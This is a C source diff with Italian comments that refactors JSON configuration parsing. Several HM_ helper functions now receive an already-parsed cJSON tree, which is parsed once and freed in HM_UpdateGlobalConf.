@@ -43,15 +43,11 @@ static HANDLE conf_file_handle = NULL;
 
 // Passa alla callback tutti i sotto-oggetti dell'oggetto "section" nella configurazione json
 typedef void (WINAPI* conf_callback_t)(cJSON *, DWORD counter);
-BOOL HM_ParseConfSection(char* conf, const char* section, conf_callback_t call_back)
+BOOL HM_ParseConfSection(cJSON *root, const char* section, conf_callback_t call_back)
 {
 	DWORD counter = 0;
-	
-	cJSON* root = cJSON_Parse(conf);
 
 	if (cJSON_IsObject(root) == false) {
-		if (root != NULL)
-			cJSON_Delete(root);
 		return FALSE;
 	}
 
@@ -63,36 +59,30 @@ BOOL HM_ParseConfSection(char* conf, const char* section, conf_callback_t call_b
 			call_back(n, counter++);
 	}
 
-	cJSON_Delete(root);
 	return TRUE;
 }
 
 // Passa l'oggetto json delle globals
-BOOL HM_ParseConfGlobals(char* conf, conf_callback_t call_back)
+BOOL HM_ParseConfGlobals(cJSON *root, conf_callback_t call_back)
 {
-	cJSON* root = cJSON_Parse(conf);
-
 	if (cJSON_IsObject(root)) {
 		cJSON* globals = cJSON_GetObjectItem(root, "globals");
 		if (globals != NULL)
 			call_back(globals, 0);
 	}
 
-	cJSON_Delete(root);
 	return TRUE;
 }
 
-BOOL HM_CountConfSection(char* conf, const char* sectionName, DWORD* count)
+BOOL HM_CountConfSection(cJSON *root, const char* sectionName, DWORD* count)
 {
 	*count = 0;
-	cJSON* root = cJSON_Parse(conf);
 	
 	if (cJSON_IsObject(root)) {
 		cJSON* section = cJSON_GetObjectItem(root, sectionName);
 		*count = cJSON_GetArraySize(section);
 	}
 	
-	cJSON_Delete(root);
 	if (*count != 0)
 		return TRUE;
 	return FALSE;
@@ -167,8 +157,11 @@ void HM_UpdateGlobalConf()
 	// Legge la lista dei processi da bypassare e la gestione del driver
 	conf_memory = HM_ReadClearConf(shared.H4_CONF_FILE);
 	if (conf_memory) {
-		HM_ParseConfGlobals(conf_memory, &ParseBypassCallback);
-		HM_ParseConfGlobals(conf_memory, &ParseDriverHandling);
+		cJSON* root = cJSON_Parse(conf_memory);
+
+		HM_ParseConfGlobals(root, &ParseBypassCallback);
+		HM_ParseConfGlobals(root, &ParseDriverHandling);
+		cJSON_Delete(root);
 	}
 	SAFE_FREE(conf_memory);
 }
